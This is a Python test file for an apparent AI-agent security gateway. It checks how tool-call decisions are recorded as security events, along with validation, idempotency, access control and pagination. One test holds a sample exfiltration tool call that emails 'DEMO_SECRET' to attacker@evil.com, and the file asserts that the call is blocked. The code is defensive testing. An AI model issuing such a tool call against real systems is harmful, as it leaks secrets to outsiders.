"""Unit and API tests for Firestore ``security_events`` collection and evaluation recording."""

from __future__ import annotations

from copy import deepcopy
from datetime import UTC, datetime, timedelta
from pathlib import Path
from types import SimpleNamespace
from typing import Any

from fastapi.testclient import TestClient
from google.cloud import firestore
import pytest

from backend.app.api import evaluation as eval_api
from backend.app.api import security_events as sec_api
from backend.app.core import auth as auth_module
from backend.app.main import app
from backend.app.models.enums import RiskLevel, SecurityDecision
from backend.app.models.security_event import SecurityEvent
from backend.app.services.audit_logger import AuditLogger, get_audit_service
from backend.app.storage.database import Database
from backend.app.storage.firestore_security_event_repository import (
    FirestoreSecurityEventRepository,
    SecurityEventConflictError,
    SecurityEventDuplicateError,
    SecurityEventValidationError,
)


class _FakeSnapshot:
    def __init__(self, doc_id: str, data: dict[str, Any] | None) -> None:
        self.id = doc_id
        self._data = deepcopy(data) if data is not None else None

    @property
    def exists(self) -> bool:
        return self._data is not None

    def to_dict(self) -> dict[str, Any] | None:
        return deepcopy(self._data) if self._data is not None else None


class _FakeClock:
    def __init__(self) -> None:
        self.current = datetime(2026, 11, 28, 12, 0, 0, tzinfo=UTC)

    def tick(self) -> datetime:
        self.current = self.current + timedelta(seconds=1)
        return self.current


class _FakeDocumentRef:
    def __init__(self, store: dict[str, dict[str, Any]], doc_id: str, clock: _FakeClock) -> None:
        self._store = store
        self.id = doc_id
        self._clock = clock

    def _materialize(self, payload: dict[str, Any]) -> dict[str, Any]:
        now = self._clock.tick()
        out: dict[str, Any] = {}
        for k, v in payload.items():
            out[k] = now if v is firestore.SERVER_TIMESTAMP else deepcopy(v)
        return out

    def get(self, transaction: Any | None = None) -> _FakeSnapshot:
        return _FakeSnapshot(self.id, self._store.get(self.id))

    def create(self, data: dict[str, Any]) -> None:
        if self.id in self._store:
            raise RuntimeError("409 Document already exists")
        self._store[self.id] = self._materialize(data)


class _FakeCountQuery:
    def __init__(self, count_value: int) -> None:
        self._count_value = count_value

    def get(self):
        return [[SimpleNamespace(value=self._count_value)]]


class _FakeQuery:
    def __init__(
        self,
        store: dict[str, dict[str, Any]],
        clock: _FakeClock,
        filters: list[tuple[str, str, Any]] | None = None,
        order_field: str | None = None,
        descending: bool = False,
        after_id: str | None = None,
        limit_val: int | None = None,
    ) -> None:
        self._store = store
        self._clock = clock
        self._filters = filters or []
        self._order_field = order_field
        self._descending = descending
        self._after_id = after_id
        self._limit_val = limit_val

    def _matching_items(self) -> list[tuple[str, dict[str, Any]]]:
        items = list(self._store.items())
        for field, op, val in self._filters:
            if op == "==":
                items = [(k, d) for k, d in items if d.get(field) == val]
            elif op == ">=":
                items = [(k, d) for k, d in items if d.get(field) >= val]
            elif op == "<":
                items = [(k, d) for k, d in items if d.get(field) < val]
        if self._order_field:
            items.sort(key=lambda pair: pair[1].get(self._order_field), reverse=self._descending)
        if self._after_id is not None:
            idx = next((i for i, (k, _) in enumerate(items) if k == self._after_id), None)
            if idx is not None:
                items = items[idx + 1 :]
        if self._limit_val is not None:
            items = items[: self._limit_val]
        return items

    def where(self, *, filter: Any) -> "_FakeQuery":
        return _FakeQuery(
            self._store,
            self._clock,
            filters=[*self._filters, (filter.field_path, filter.op_string, filter.value)],
            order_field=self._order_field,
            descending=self._descending,
            after_id=self._after_id,
            limit_val=self._limit_val,
        )

    def order_by(self, field: str, direction: Any = None) -> "_FakeQuery":
        return _FakeQuery(
            self._store,
            self._clock,
            filters=self._filters,
            order_field=field,
            descending=(direction == firestore.Query.DESCENDING),
            after_id=self._after_id,
            limit_val=self._limit_val,
        )

    def start_after(self, anchor: _FakeSnapshot) -> "_FakeQuery":
        return _FakeQuery(
            self._store,
            self._clock,
            filters=self._filters,
            order_field=self._order_field,
            descending=self._descending,
            after_id=anchor.id,
            limit_val=self._limit_val,
        )

    def limit(self, value: int) -> "_FakeQuery":
        return _FakeQuery(
            self._store,
            self._clock,
            filters=self._filters,
            order_field=self._order_field,
            descending=self._descending,
            after_id=self._after_id,
            limit_val=value,
        )

    def count(self) -> _FakeCountQuery:
        return _FakeCountQuery(len(self._matching_items()))

    def stream(self) -> list[_FakeSnapshot]:
        return [_FakeSnapshot(doc_id, data) for doc_id, data in self._matching_items()]


class _FakeCollection(_FakeQuery):
    def document(self, doc_id: str) -> _FakeDocumentRef:
        return _FakeDocumentRef(self._store, doc_id, self._clock)


class _FakeTransaction:
    def __init__(self) -> None:
        self._ops: list[tuple[str, _FakeDocumentRef, dict[str, Any]]] = []
        self._max_attempts = 1
        self._read_only = False
        self._id = b"fake-sec-tx"

    def create(self, ref: _FakeDocumentRef, data: dict[str, Any]) -> None:
        self._ops.append(("create", ref, data))

    def _begin(self, retry_id: Any = None) -> None:
        self._ops.clear()

    def _clean_up(self) -> None:
        self._ops.clear()

    def _rollback(self) -> None:
        self._ops.clear()

    def _commit(self) -> list[Any]:
        for op, ref, data in self._ops:
            if op == "create":
                ref.create(data)
        self._ops.clear()
        return []


class _FakeFirestoreClient:
    def __init__(self) -> None:
        self._collections: dict[str, dict[str, dict[str, Any]]] = {}
        self._clock = _FakeClock()

    def collection(self, name: str) -> _FakeCollection:
        store = self._collections.setdefault(name, {})
        return _FakeCollection(store, self._clock)

    def transaction(self) -> _FakeTransaction:
        return _FakeTransaction()


class _ProdSettings:
    firebase_auth_required = True
    environment = "production"
    firebase_project_id = "agentshield-prod"
    firebase_auth_emulator_host = None
    google_application_credentials = None
    database_mode = "firestore"
    rate_limit_backend = "memory"
    rate_limit_requests = 1000000
    rate_limit_window_seconds = 60
    rate_limit_fail_open = False
    max_request_bytes = 262144
    trusted_proxy_count = 0
    dev_auth_identities = ""
    dev_auth_allow_remote = False


@pytest.fixture
def security_events_env(tmp_path: Path, monkeypatch):
    fs_client = _FakeFirestoreClient()
    repo = FirestoreSecurityEventRepository(client=fs_client)
    audit_logger = AuditLogger(db=Database(tmp_path / "sec_events_audit.db"))

    tokens = {
        "admin-tok": {"uid": "uid-admin", "role": "ADMIN", "aud": "agentshield-prod", "email_verified": True},
        "reviewer-tok": {"uid": "uid-reviewer", "role": "REVIEWER", "aud": "agentshield-prod", "email_verified": True},
        "viewer-tok": {"uid": "uid-viewer", "role": "VIEWER", "aud": "agentshield-prod", "email_verified": True},
        "viewer2-tok": {"uid": "uid-viewer-2", "role": "VIEWER", "aud": "agentshield-prod", "email_verified": True},
    }

    def fake_verify(token: str) -> dict[str, Any]:
        if token not in tokens:
            raise ValueError("Invalid token")
        return tokens[token]

    monkeypatch.setattr(auth_module, "get_settings", lambda: _ProdSettings())
    monkeypatch.setattr(auth_module, "verify_firebase_id_token", fake_verify)

    app.dependency_overrides[get_audit_service] = lambda: audit_logger
    app.dependency_overrides[sec_api.get_security_event_repository] = lambda: repo
    app.dependency_overrides[eval_api.get_optional_security_event_repository] = lambda: repo

    with TestClient(app) as client:
        yield client, repo, fs_client

    app.dependency_overrides.clear()


# ---------------------------------------------------------------------------
# Schema, metadata validation & idempotency tests
# ---------------------------------------------------------------------------


def test_security_event_validation_rejects_invalid_decision_risk_and_secrets() -> None:
    now = datetime.now(UTC)
    base = {
        "event_id": "evt-1",
        "user_id": "uid-1",
        "agent_id": "agent-alpha",
        "tool_name": "send_email",
        "decision": "ALLOW",
        "risk_level": "LOW",
        "reason": "Allowed by policy.",
        "policy_id": "allow-approved",
        "correlation_id": "corr-1",
        "created_at": now,
        "metadata": {"destination_class": "APPROVED"},
    }
    valid = SecurityEvent(**base)
    assert valid.decision == SecurityDecision.ALLOW
    assert valid.risk_level == RiskLevel.LOW

    with pytest.raises(ValueError):
        SecurityEvent(**{**base, "decision": "PERMIT"})
    with pytest.raises(ValueError):
        SecurityEvent(**{**base, "risk_level": "EXTREME"})
    with pytest.raises(ValueError):
        SecurityEvent(**{**base, "metadata": {"password": "123"}})
    with pytest.raises(ValueError):
        SecurityEvent(**{**base, "metadata": {"access_token": "abc"}})
    with pytest.raises(ValueError):
        SecurityEvent(**{**base, "metadata": {"nested": {"private_key": "pem"}}})
    with pytest.raises(ValueError):
        SecurityEvent(**{**base, "metadata": {"note": "-----BEGIN RSA PRIVATE KEY-----"}})
    with pytest.raises(ValueError):
        SecurityEvent(**{**base, "metadata": {"arguments": {"raw": "secret"}}})


def test_repository_prevents_duplicates_and_overwrites() -> None:
    fs_client = _FakeFirestoreClient()
    repo = FirestoreSecurityEventRepository(client=fs_client)

    ev, created = repo.create_event(
        event_id="evt-unique-1",
        user_id="uid-1",
        agent_id="agent-1",
        tool_name="send_email",
        decision=SecurityDecision.ALLOW,
        risk_level=RiskLevel.LOW,
        reason="Benign tool call",
        policy_id="default-allow",
        correlation_id="corr-1",
        metadata={"destination_class": "APPROVED"},
    )
    assert created is True
    assert ev.event_id == "evt-unique-1"

    # Non-idempotent duplicate fails without overwriting
    with pytest.raises(SecurityEventDuplicateError):
        repo.create_event(
            event_id="evt-unique-1",
            user_id="uid-1",
            agent_id="agent-1",
            tool_name="send_email",
            decision=SecurityDecision.BLOCK,
            risk_level=RiskLevel.CRITICAL,
            reason="Overwrite attempt",
            policy_id="default-block",
        )
    assert repo.get_by_id("evt-unique-1").decision == SecurityDecision.ALLOW

    # Idempotent replay with same event attributes returns existing record without creating a duplicate
    replayed, created2 = repo.create_event(
        event_id="evt-unique-1",
        user_id="uid-1",
        agent_id="agent-1",
        tool_name="send_email",
        decision=SecurityDecision.ALLOW,
        risk_level=RiskLevel.LOW,
        reason="Benign tool call",
        policy_id="default-allow",
        idempotent=True,
    )
    assert created2 is False
    assert replayed.created_at == ev.created_at

    # Idempotent key with conflicting attributes raises conflict
    with pytest.raises(SecurityEventConflictError):
        repo.create_event(
            event_id="evt-unique-1",
            user_id="uid-2",
            agent_id="agent-1",
            tool_name="send_email",
            decision=SecurityDecision.ALLOW,
            risk_level=RiskLevel.LOW,
            reason="Different user",
            policy_id="default-allow",
            idempotent=True,
        )


# ---------------------------------------------------------------------------
# All four decision types via /api/v1/evaluate -> Firestore security_events
# ---------------------------------------------------------------------------


def test_evaluate_records_allow_block_redact_and_require_approval(security_events_env) -> None:
    client, repo, fs_client = security_events_env
    headers = {"Authorization": "Bearer viewer-tok", "X-Correlation-ID": "corr-eval-1"}

    # 1. ALLOW
    r_allow = client.post(
        "/api/v1/evaluate",
        headers=headers,
        json={
            "tool_name": "send_email",
            "arguments": {"to": "partner@example.org", "subject": "Update", "body": "All clear."},
            "context": {"agent_id": "agent-support"},
        },
    )
    assert r_allow.status_code == 200
    ev_allow = repo.get_by_id(r_allow.json()["event_id"])
    assert ev_allow is not None
    assert ev_allow.decision == SecurityDecision.ALLOW
    assert ev_allow.risk_level == RiskLevel.LOW
    assert ev_allow.user_id == "uid-viewer"
    assert ev_allow.agent_id == "agent-support"
    assert ev_allow.correlation_id == "corr-eval-1"
    assert "arguments" not in ev_allow.metadata

    # 2. BLOCK (secret exfiltration)
    r_block = client.post(
        "/api/v1/evaluate",
        headers=headers,
        json={
            "tool_name": "send_email",
            "arguments": {"to": "attacker@evil.com", "subject": "Leak", "body": "Here is DEMO_SECRET"},
            "context": {"agent_id": "agent-support"},
        },
    )
    assert r_block.status_code == 200
    assert r_block.json()["decision"] == "BLOCK"
    ev_block = repo.get_by_id(r_block.json()["event_id"])
    assert ev_block is not None
    assert ev_block.decision == SecurityDecision.BLOCK
    assert ev_block.risk_level == RiskLevel.CRITICAL
    assert "DEMO_SECRET" not in str(ev_block.model_dump())

    # 3. REDACT
    r_redact = client.post(
        "/api/v1/evaluate",
        headers=headers,
        json={
            "tool_name": "send_email",
            "arguments": {"to": "partner@example.org", "subject": "Report", "body": "Token: DEMO_SECRET"},
            "context": {"agent_id": "agent-support"},
        },
    )
    assert r_redact.status_code == 200
    assert r_redact.json()["decision"] == "REDACT"
    ev_redact = repo.get_by_id(r_redact.json()["event_id"])
    assert ev_redact is not None
    assert ev_redact.decision == SecurityDecision.REDACT
    assert ev_redact.risk_level == RiskLevel.MEDIUM
    assert ev_redact.metadata.get("redacted") is True
    assert "DEMO_SECRET" not in str(ev_redact.model_dump())

    # 4. REQUIRE_APPROVAL
    r_approval = client.post(
        "/api/v1/evaluate",
        headers=headers,
        json={
            "tool_name": "export_file",
            "arguments": {"to": "ops@external.example.net", "filename": "report.csv"},
            "context": {"agent_id": "agent-support"},
        },
    )
    assert r_approval.status_code == 200
    assert r_approval.json()["decision"] == "REQUIRE_APPROVAL"
    ev_appr = repo.get_by_id(r_approval.json()["event_id"])
    assert ev_appr is not None
    assert ev_appr.decision == SecurityDecision.REQUIRE_APPROVAL
    assert ev_appr.risk_level in (RiskLevel.MEDIUM, RiskLevel.HIGH)

    assert len(fs_client._collections["security_events"]) == 4


def test_security_events_api_rejects_invalid_inputs_and_unauthorized_access(security_events_env) -> None:
    client, _, _ = security_events_env

    # Unauthenticated creation and listing rejected
    assert client.post("/api/v1/security-events", json={}).status_code == 401
    assert client.get("/api/v1/security-events").status_code == 401

    # Invalid decision rejected
    bad_decision = client.post(
        "/api/v1/security-events",
        headers={"Authorization": "Bearer admin-tok"},
        json={
            "agent_id": "a1",
            "tool_name": "send_email",
            "decision": "INVALID_DECISION",
            "risk_level": "LOW",
            "reason": "test",
            "policy_id": "p1",
        },
    )
    assert bad_decision.status_code == 422

    # Metadata containing password/token/private_key rejected
    bad_meta = client.post(
        "/api/v1/security-events",
        headers={"Authorization": "Bearer admin-tok"},
        json={
            "agent_id": "a1",
            "tool_name": "send_email",
            "decision": "BLOCK",
            "risk_level": "HIGH",
            "reason": "test",
            "policy_id": "p1",
            "metadata": {"access_token": "secret-jwt"},
        },
    )
    assert bad_meta.status_code == 422

    # Idempotency header prevents duplicate creation
    headers = {"Authorization": "Bearer viewer-tok", "X-Idempotency-Key": "idem-key-1"}
    payload = {
        "agent_id": "a1",
        "tool_name": "send_email",
        "decision": "ALLOW",
        "risk_level": "LOW",
        "reason": "Allowed",
        "policy_id": "p1",
        "metadata": {"destination_class": "APPROVED"},
    }
    first = client.post("/api/v1/security-events", headers=headers, json=payload)
    second = client.post("/api/v1/security-events", headers=headers, json=payload)
    assert first.status_code == 201
    assert second.status_code == 200
    assert first.json()["event_id"] == second.json()["event_id"] == "idem-key-1"

    # Viewer cannot read or filter another user's events
    assert client.get("/api/v1/security-events", headers={"Authorization": "Bearer viewer2-tok"}, params={"user_id": "uid-viewer"}).status_code == 403
    assert client.get("/api/v1/security-events/idem-key-1", headers={"Authorization": "Bearer viewer2-tok"}).status_code == 403
    # Reviewer/Admin can read it
    assert client.get("/api/v1/security-events/idem-key-1", headers={"Authorization": "Bearer reviewer-tok"}).status_code == 200


def test_security_events_filtering_and_cursor_pagination(security_events_env) -> None:
    client, repo, _ = security_events_env

    for i in range(5):
        repo.create_event(
            event_id=f"evt-page-{i}",
            user_id="uid-viewer" if i % 2 == 0 else "uid-admin",
            agent_id="agent-page",
            tool_name="send_email",
            decision=SecurityDecision.ALLOW if i < 3 else SecurityDecision.BLOCK,
            risk_level=RiskLevel.LOW if i < 3 else RiskLevel.HIGH,
            reason=f"Event {i}",
            policy_id="p-page",
            correlation_id=f"corr-{i}",
        )

    # Cursor pagination across all 5 events (pages of 2)
    seen, cursor = [], None
    while True:
        params = {"limit": 2, **({"cursor": cursor} if cursor else {})}
        page = client.get("/api/v1/security-events", headers={"Authorization": "Bearer admin-tok"}, params=params)
        assert page.status_code == 200
        data = page.json()
        assert data["total"] == 5
        seen.extend(item["event_id"] for item in data["items"])
        cursor = data["next_cursor"]
        if not cursor:
            break
    assert len(seen) == len(set(seen)) == 5

    # Filter by decision + user_id + date
    filtered = client.get(
        "/api/v1/security-events",
        headers={"Authorization": "Bearer admin-tok"},
        params={"user_id": "uid-viewer", "decision": "ALLOW", "date": "2026-11-28"},
    )
    assert filtered.status_code == 200
    assert filtered.json()["total"] == 2
    assert all(item["user_id"] == "uid-viewer" and item["decision"] == "ALLOW" for item in filtered.json()["items"])
